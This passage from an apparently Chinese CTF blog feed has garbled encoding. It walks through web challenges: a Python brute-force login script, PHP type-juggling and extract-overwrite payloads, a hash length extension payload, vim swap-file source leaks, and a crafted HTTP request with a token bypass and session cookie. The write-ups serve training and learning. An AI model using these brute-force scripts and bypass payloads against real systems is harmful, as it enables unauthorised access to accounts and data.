id="ä¸æ˜è§‰å‰"><a href="#ä¸æ˜è§‰å‰" class="headerlink" title="ä¸æ˜è§‰å‰"></a>ä¸æ˜è§‰å‰</h2><p>æŸ¥çœ‹æºç å‘ç°æœ‰<code>9s81jWjd98YU.php</code><br>æŸ¥çœ‹å‘ç°æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå…ˆè¦æƒ³æƒ³æœ‰æ²¡æœ‰æ³¨å…¥<br>è¾“å…¥â€™å‘ç°æ²¡æœ‰è¿‡æ»¤å¹¶ä¸”åªæœ‰adminä¸€ä¸ªç”¨æˆ·<br>åªèƒ½ç”¨çˆ†ç ´äº†<br>è¿™é‡Œå­¦ä¼šäº†å¦‚ä½•ç”¨ç»å¯¹ä½ç½®è·å–éªŒè¯ç <br>å†æ¬¡æŸ¥çœ‹æºç å‘ç°å¯†ç èŒƒå›´åœ¨(11111, 12111)ï¼Œå¹¶ä¸”å‘ç°è¿™é‡Œçš„usernameè¿˜æœ‰passwordéƒ½æ˜¯ä»¥getæ–¹å¼å»æäº¤çš„<br>å†™ä¸ªè„šæœ¬çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(url)</span>:</span></span><br><span class="line">url = url</span><br><span class="line">Talk = requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">11111</span>, <span class="number">12112</span>):</span><br><span class="line">ans = Talk.get(url)</span><br><span class="line">Randcode = ans.content[ans.content.find(<span class="string">'randcode'</span>)+<span class="number">23</span>:ans.content.find(<span class="string">'randcode'</span>)+<span class="number">26</span>]</span><br><span class="line">res = Talk.get(url+<span class="string">'?username=admin&amp;password='</span>+str(i)+<span class="string">'&amp;randcode='</span>+Randcode)</span><br><span class="line"><span class="keyword">print</span> len(res.content)</span><br><span class="line"><span class="keyword">if</span> len(res.content)!=<span class="number">160</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Success! Your password is '</span>+str(i)+<span class="string">'\n'</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">url = <span class="string">'http://daka.whaledu.com/web/web38/9s81jWjd98YU.php'</span></span><br><span class="line">solve(url)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Something Wrong!'</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flag</p><h2 id="ç­‰é‡ç™»å½•"><a href="#ç­‰é‡ç™»å½•" class="headerlink" title="ç­‰é‡ç™»å½•"></a>ç­‰é‡ç™»å½•</h2><p>é¦–å…ˆæŸ¥çœ‹æºä»£ç å‘ç°<code>index.phps</code><br>å‘ç°æ˜¯ä»£ç å®¡è®¡çš„é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜å¾ˆç®€å•ï¼Œåˆ©ç”¨çš„æ˜¯shaå‡½æ•°çš„æ¼æ´å»ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure><h2 id="å¼ºåŠ¿æ›¿æ¢"><a href="#å¼ºåŠ¿æ›¿æ¢" class="headerlink" title="å¼ºåŠ¿æ›¿æ¢"></a>å¼ºåŠ¿æ›¿æ¢</h2><p>åˆæ˜¯ä¸€é“ä»£ç å®¡è®¡çš„é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($vs))&#123;</span><br><span class="line">    $Ff = trim(file_get_contents($fF));</span><br><span class="line">        <span class="keyword">if</span>($vs!=$Ff)&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5($vs) == md5($Ff))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span>.$flag.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="string">"&lt;p&gt;Variable extract!&lt;/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hacker!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>éƒ½æ˜¯å¾ˆç®€å•çš„é¢˜ç›®åˆ©ç”¨äº†extractå…¨å±€å˜é‡è¦†ç›–è¿˜æœ‰file_get_contentså‡½æ•°ä¸ºåè®®ä»¥åŠMD5å¼±ç±»å‹æ¯”è¾ƒçš„æ€§è´¨<br>æ„é€ payload:<code>?vs=QNKCDZO&amp;fF=php://input</code><br>postæ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br></pre></td></tr></table></figure><h2 id="æ­£åˆ™è¿›å…¥"><a href="#æ­£åˆ™è¿›å…¥" class="headerlink" title="æ­£åˆ™è¿›å…¥"></a>æ­£åˆ™è¿›å…¥</h2><p>æŸ¥çœ‹æºç æ²¡å‘ç°ä»»ä½•ä¸œè¥¿ï¼Œåªèƒ½å»è€ƒè™‘æºç æ³„éœ²çš„é—®é¢˜äº†ï¼Œè¯•ä¸€ä¸‹index.php~å‡ºç°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"waht the hell?"</span>;</span><br><span class="line">$flag = <span class="string">"*******"</span>; </span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>]) </span><br><span class="line">&#123; </span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        $c = <span class="number">0</span>; </span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password)) </span><br><span class="line">                $c += <span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€äº›é¢„å¤‡çŸ¥è¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[:graph:]åŒ¹é…ä»»ä½•å¯è§å­—ç¬¦</span><br><span class="line"></span><br><span class="line">[:punct:]åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·</span><br><span class="line"></span><br><span class="line">[:digit:]åŒ¹é…ä»»ä½•æ•°å­—</span><br><span class="line"></span><br><span class="line">[:upper:]åŒ¹é…ä»»ä½•å¤§å†™å­—æ¯</span><br><span class="line"></span><br><span class="line">[:lower:]åŒ¹é…ä»»ä½•å°å†™å­—æ¯</span><br><span class="line"></span><br><span class="line">+è¡¨ç¤ºä¸€æ¬¡åŠä»¥ä¸Š</span><br><span class="line"></span><br><span class="line">|è¡¨ç¤ºæˆ–è€…</span><br></pre></td></tr></table></figure><p>/^[[:graph:]]{12,}$/åŒ¹é…12ä¸ªåŠä»¥ä¸Šçš„å¯è§å­—ç¬¦</p><p>/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/åŒ¹é…æ ‡ç‚¹ã€æ•°å­—ã€å¤§å†™å­—æ¯ã€å°å†™å­—æ¯ä¸­çš„ä¸€ä¸ª</p><p>ç»“æ•´æ®µä»£ç æ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦postä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²çš„å€¼ä¸º42ï¼Œå¹¶ä¸”è¦åŒ…å«æ ‡ç‚¹ã€æ•°å­—ã€å¤§å†™å­—æ¯ã€å°å†™å­—æ¯ä¸­ä¸‰ä¸ªåŠä»¥ä¸Šç±»å‹ï¼ŒåŒæ—¶åŒ¹é…æ¬¡æ•°è¦ä¸å°äº6æ¬¡<br>äºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç§‘å­¦è®¡æ•°æ³•å»æ„é€ <br><code>password=42.000000e+0</code>æˆ–è€…æ˜¯<code>420.00000e-1</code></p><h2 id="å“ˆå¸Œå…¥ä¾µ"><a href="#å“ˆå¸Œå…¥ä¾µ" class="headerlink" title="å“ˆå¸Œå…¥ä¾µ"></a>å“ˆå¸Œå…¥ä¾µ</h2><p>hashé•¿åº¦æ‰©å±•æ”»å‡»<br>å¯ä»¥ç”¨hashdumpä¹Ÿå¯ä»¥ç”¨githubä¸Šçš„è„šæœ¬<br>ä»¥å‰çš„åšå®¢æœ‰äº›æ€ä¹ˆç”¨å°±ä¸å¤šè¯´äº†<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00P%00%00%00%00%00%00%00whaleCTF&amp;hash=aab9a3180e92bd4126d56011b672711f</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®éªŒå§ å¿˜è®°å¯†ç äº†wp</title>
      <link href="/shiyanba1-wp.html"/>
      <url>/shiyanba1-wp.html</url>
      <content type="html"><![CDATA[<p>è¿™ä¸ªé¢˜ä¸€å¼€å§‹ç»™äº†ä¸€ä¸ªç™»å½•æ¡†<br>å…ˆä¸ç®¡è¾“å…¥ä¸œè¥¿æŠ“ä¸€ä¸ªåŒ…çœ‹ä¸€ä¸‹<br><a id="more"></a><br>å‘ç°æœ‰å‡ æ ·æœ‰ç”¨çš„ä¸œè¥¿<br>ç¬¬ä¸€ä¸ªæ˜¯adminå¯¹åº”çš„é‚®ç®±<a href="mailto:`admin@simplexue.com" target="_blank" rel="noopener">`admin@simplexue.com</a><code>ç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªVimã€‚ã€‚ã€‚ã€‚è¿™é‡Œå°±è¦è®²ä¸€ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹ä¸€ã€vimå¤‡ä»½æ–‡ä»¶é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨Vimç¼–ç¨‹ï¼Œåœ¨ä¿®æ”¹æ–‡ä»¶åç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¸¦</code>~`çš„å¤‡ä»½æ–‡ä»¶ï¼ŒæŸäº›æƒ…å†µä¸‹å¯ä»¥å¯¹å…¶ä¸‹è½½è¿›è¡ŒæŸ¥çœ‹ï¼›</p><p>eg:<br>index.phpæ™®éæ„ä¹‰ä¸Šçš„é¦–é¡µï¼Œè¾“å…¥åŸŸåä¸ä¸€å®šä¼šæ˜¾ç¤ºã€‚   å®ƒçš„å¤‡ä»½æ–‡ä»¶åˆ™ä¸ºindex.php~<br>è¿™é‡Œæˆ‘åˆæƒ³åˆ°äº†æ–‡ä»¶ç»•è¿‡æœ‰æ—¶å€™éœ€è¦PHPçš„åˆ«å<code>php1ï¼Œphp2ï¼Œphp3ï¼Œphp4ï¼Œphp5ï¼Œphtml</code>ç­‰ã€‚ã€‚ã€‚</p><p>äºŒã€vimä¸´æ—¶æ–‡ä»¶<br>vimä¸­çš„swpå³swapæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿï¼Œå®ƒæ˜¯éšè—æ–‡ä»¶ï¼Œå¦‚æœåŸæ–‡ä»¶åæ˜¯submitï¼Œåˆ™å®ƒçš„ä¸´æ—¶æ–‡ä»¶ .submit.swpã€‚å¦‚æœæ–‡ä»¶æ­£å¸¸é€€å‡ºï¼Œåˆ™æ­¤æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ã€‚</p><p>æ¯”èµ›çš„æ—¶å€™å¤šè¯•å‡ ä¸ªåå­—ï¼Œå¯èƒ½ä¼šè¿™æ ·<code>submit.php.swp,submit.swp,.submit.php.swp</code>ï¼Œå› ä¸ºå‡ºé¢˜äººå¯èƒ½å‡ºçº°æ¼</p><p>è¿˜æœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./step2.php?email=youmail@mail.com&amp;check=???????</span><br></pre></td></tr></table></figure><p>è¿›å»çœ‹çœ‹å‘ç°äº†<code>submit.php</code>ï¼Œè¿›åˆ°è¿™ä¸ªé¡µé¢<br>æç¤ºæˆ‘ä¸æ˜¯adminâ€¦<br>å°±å°è¯•ä¸€ä¸‹å‡ ä¸ªæºç æ³„éœ²çš„æ–‡ä»¶å<br>.submit.php.swpå‡ºç°äº†ä¸€éƒ¨åˆ†æºç <br>å…³é”®éƒ¨åˆ†æ˜¯ä¸‹é¢è¿™éƒ¨åˆ†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æ¾¶è¾«è§¦æµœå——æ†–"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ—¢ç„¶ä¸æ˜¯adminï¼Œæˆ‘ä»¬å°±æƒ³èµ·æ¥åˆšæ‰æœ‰ç”¨çš„æ¡ä»¶<br>adminçš„é‚®ç®±ã€‚ã€‚å¯¹åº”emailAddresså˜é‡<br>è€ŒtokenæŒ‰åœ¨ä»£ç çš„æ„æ€å°±æ˜¯åªè¦tokenç­‰äº0å¹¶ä¸”æ»¡è¶³10ä½çš„é•¿åº¦å³å¯ã€‚<br>é‚£æˆ‘ä»¬æ„é€ <code>token=0000000000</code></p><p>å‘åŒ…å³å¯ï¼Œæˆ‘çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000 HTTP/1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1521036323,1521095482,1521202069,1521267229; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*132367%2CnickName%3A0verWatch; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1521269078; PHPSESSID=7in5h4q423rsfsmv6123rlab84</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è®°ä¸€é“ä»£ç å®¡è®¡é¢˜ç›®</title>
      <link href="/phpcheck2.html"/>
      <url>/phpcheck2.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªé¢˜ç›®å¥½åƒåšäº†ä¸¤éäº†ã€‚ã€‚ã€‚ã€‚ä»è¿™é“é¢˜ç›®é‡Œé¢å­¦åˆ°çš„ä¸œè¥¿è¿˜æ˜¯éœ€è¦è®°å½•ä¸€ä¸‹</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123; </span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ¥çœ‹ä»£ç <br>åˆ†æè¿‡åæˆ‘ä»¬å‘ç°è¿™æ®µä»£ç å¾—æ»¡è¶³å››ä¸ªæ¡ä»¶<br>1.å¿…é¡»æ˜¯å­—ç¬¦ä¸²<br>2.å‚æ•°numberä¸å˜æ¢ä¸ºæ•´å½¢å†å˜æ¢ä¸ºå­—ç¬¦ä¸²çš„numberç›¸ç­‰<br>3.numberå‚æ•°åè½¬åå¿…é¡»ç›¸ç­‰<br>4.ä¸æ˜¯æ°´ä»™èŠ±æ•°</p><p>ä¼¼ä¹1è·Ÿ2æ¡ä»¶å†²çªï¼Œ3è·Ÿ4æ¡ä»¶ä¹Ÿå†²çªï¼Œå¦‚ä½•æ„é€ å‘¢ï¼Ÿ<br>ä¸‹é¢å°±ç»™å‡ºä¸¤ç§åŠæ³•</p><p>1.<code>number=0e00%00æˆ–è€…0e00%20</code><br>  è¿™é‡Œçš„%00è¡¨ç¤ºç©ºå­—ç¬¦ä¸²ï¼Œ%20è¡¨ç¤ºæ˜¯ç©ºæ ¼ï¼Œè¿™æ ·ä¸€æ¥å°±æ»¡è¶³äº†ä¸Šè¿°å››ä¸ªæ¡ä»¶<br>  